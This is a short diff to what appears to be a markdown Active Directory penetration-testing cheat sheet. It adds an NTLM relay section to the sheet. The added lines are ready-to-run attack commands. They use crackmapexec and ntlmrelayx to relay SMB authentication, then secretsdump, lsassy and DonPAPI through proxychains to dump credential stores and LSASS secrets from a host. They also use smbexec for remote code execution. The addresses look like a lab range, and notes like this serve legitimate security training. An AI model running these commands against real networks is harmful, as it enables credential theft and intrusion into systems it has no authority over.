@@ -62,3 +62,16 @@
 
 - DNS dump  
 `adidnsdump -u 'DOMAIN\USER' -p 'PASS' DOMAIN`
+
+- Try responder + ntlmrelayx to smb    
+`cme smb 192.168.56.10-23 --gen-relay-list relay.txt`    
+`ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks`
+  - dump secrets  
+`proxychains secretsdump -no-pass 'DOMAIN'/'USER'@'192.168.56.22'`  
+`proxychains lsassy --no-pass -d DOMAIN -u USER 192.168.56.22`
+`proxychains DonPAPI -no-pass 'DOMAIN'/'USER'@'192.168.56.22'`
+  - Smbclient  
+`proxychains smbclient.py -no-pass 'DOMAIN'/'USER'@'192.168.56.22' -debug`
+  - Code execution : smbexec or atexec  
+`proxychains smbexec.py -no-pass 'DOMAIN'/'USER'@'192.168.56.22' -debug`
+  - And other relays...
